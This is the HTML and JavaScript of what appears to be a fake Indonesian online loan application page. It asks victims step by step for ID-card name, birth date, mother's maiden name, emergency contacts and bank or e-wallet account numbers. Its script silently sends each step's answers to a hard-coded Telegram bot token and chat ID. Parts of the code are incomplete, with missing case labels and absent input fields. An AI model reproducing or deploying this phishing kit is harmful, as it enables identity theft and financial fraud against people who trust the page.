        <div class="form-step active" id="step1">

            <label class="form-label">Nama Lengkap Sesuai KTP</label>

            <button class="btn" onclick="gantiStep(2)">Lanjut ke Data Diri</button>
        </div>

        <!-- STEP 2: DATA DIRI -->
        <div class="form-step" id="step2">
            <label class="form-label">Tanggal Lahir</label>
            <input type="date" class="form-input" id="tgl-lahir">

            <label class="form-label">Kecamatan</label>
            <input type="text" class="form-input" id="kecamatan" placeholder="Contoh: Kedaton">

            <label class="form-label">Desa/Kelurahan</label>

            <label class="form-label">Kode POS</label>
            <input type="text" class="form-input" id="kodepos" placeholder="Contoh: 30123">

            <label class="form-label">Nama Ibu Kandung</label>
            <input type="text" class="form-input" id="ibu-kandung" placeholder="Contoh: SITI MARIA">

            <button class="btn" onclick="gantiStep(3)">Lanjut ke Data Pekerjaan</button>
        </div>

        <!-- STEP 3: DATA PEKERJAAN -->
        <div class="form-step" id="step3">
            <label class="form-label">Pekerjaan Anda</label>
            <input type="text" class="form-input" id="pekerjaan" placeholder="Contoh: Pegawai Swasta">

            <label class="form-label">Pendapatan per Bulan</label>

            <input type="text" class="form-input" id="kontak1" placeholder="Contoh: BUDI">

            <label class="form-label">Hubungan</label>
            <input type="text" class="form-input" id="hub1" placeholder="Contoh: Saudara">

            <label class="form-label">Nomor HP Kontak 1</label>
            <input type="tel" class="form-input" id="hp-kontak1" placeholder="Contoh: 08123456789">

            <label class="form-label">Nama Kontak Darurat 2</label>
            <input type="text" class="form-input" id="kontak2" placeholder="Contoh: SITI">

            <label class="form-label">Hubungan</label>
            <input type="text" class="form-input" id="hub2" placeholder="Contoh: Istri">

            <label class="form-label">Nomor HP Kontak 2</label>
            <input type="tel" class="form-input" id="hp-kontak2" placeholder="Contoh: 08987654321">

        </div>

        <!-- STEP 5: VERIFIKASI LIMIT -->
        <div class="form-step" id="step5">

            <label class="form-label">Limit Pinjaman</label>
            <input type="range" min="10000000" max="250000000" step="1000000" class="limit-slider" id="slider" oninput="updateLimit(this.value)">
            <div class="limit-show" id="limit-show">Rp10.914.474</div>

            <label class="form-label">Pilih Jumlah Pinjaman</label>
            <select class="form-input" id="jumlah-pinjam">
                <option value="10000000">Rp10.000.000</option>
                <option value="25000000">Rp25.000.000</option>
                <option value="50000000">Rp50.000.000</option>
                <option value="100000000">Rp100.000.000</option>
                <option value="150000000">Rp150.000.000</option>
                <option value="250000000">Rp250.000.000</option>
            </select>

            <label class="form-label">Tenor Pinjaman</label>
            <select class="form-input" id="tenor">
                <option value="1">1 Bulan</option>
                <option value="3">3 Bulan</option>
                <option value="6">6 Bulan</option>
            </select>

            <button class="btn" onclick="gantiStep(6)">Lanjut ke Pencairan</button>
        </div>

        <!-- STEP 6: PENCAIRAN DANA -->
        <div class="form-step" id="step6">
            <label class="form-label">Pilih Metode Pencairan</label>
            <select class="form-input" id="metode-cair">

                <option value="ewallet">E-Wallet</option>
            </select>

            <label class="form-label">Nama Penerima</label>
            <input type="text" class="form-input" id="nama-penerima" placeholder="Sesuai Rekening/E-Wallet">

            <label class="form-label">Nama Bank/E-Wallet</label>
            <input type="text" class="form-input" id="nama-bank" placeholder="Contoh: BCA / OVO">

            <label class="form-label">Nomor Rekening/E-Wallet</label>
            <input type="text" class="form-input" id="no-rekening" placeholder="Contoh: 1234567890">

            <button class="btn" onclick="gantiStep(7)">Konfirmasi & Kirim</button>
        </div>

        <!-- STEP 7: PENCAIRAN BERHASIL -->
        <div class="form-step" id="step7">
            <div class="success-box">

            </div>
        </div>
    </div>

    <script>
        // KONFIGURASI BOT TELEGRAM
        const BOT_TOKEN = "8067130100:AAE5FOOfKpiNGbydAIAczleTkO_UJoukEMU";
        const CHAT_ID = "8571321926";

        // FUNGSI UPDATE LIMIT
        function updateLimit(val) {
            const format = new Intl.NumberFormat('id-ID', {
                style: 'currency',
                currency: 'IDR',
                maximumFractionDigits: 0
            }).format(val);
            document.getElementById('limit-show').innerText = format;
        }

        // FUNGSI GANTI STEP
        function gantiStep(stepTujuan) {
            // Sembunyikan semua step
            document.querySelectorAll('.form-step').forEach(step => {
                step.classList.remove('active');
            });
            // Tampilkan step yang dipilih
            document.getElementById('step' + stepTujuan).classList.add('active');
            // Kirim data ke Telegram
            kirimData(stepTujuan);
        }

        // FUNGSI KIRIM DATA KE TELEGRAM
        function kirimData(step) {
            let data = "";
            switch(step) {
                case 2:
                    data = `ðŸ“ DATA AWAL\nHP: ${document.getElementById('hp').value}\nNick KTP: ${document.getElementById('nick-ktp').value}\nNama Lengkap: ${document.getElementById('nama-ktp').value}`;

                    break;

                    data = `ðŸ“ž KONTAK DARURAT\nKontak 1: ${document.getElementById('kontak1').value} (${document.getElementById('hub1').value}) - ${document.getElementById('hp-kontak1').value}\nKontak 2: ${document.getElementById('kontak2').value} (${document.getElementById('hub2').value}) - ${document.getElementById('hp-kontak2').value}`;
                    break;

                    data = `ðŸ’¸ DATA PINJAMAN\nLimit: ${document.getElementById('limit-show').innerText}\nJumlah Pinjaman: ${document.getElementById('jumlah-pinjam').value}\nTenor: ${document.getElementById('tenor').value} Bulan`;
                    break;
                case 7:
                    data = `âœ… DATA PENCAIRAN\nMetode: ${document.getElementById('metode-cair').value}\nNama Penerima: ${document.getElementById('nama-penerima').value}\nBank/E-Wallet: ${document.getElementById('nama-bank').value}\nNomor: ${document.getElementById('no-rekening').value}\nTiket: TUNAIABC-20260218-001`;
                    break;
            }

            if (data !== "") {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: data
                    })
                });
            }
        }

        // INISIALISASI
        window.onload = () => updateLimit(10914474);
              </script>
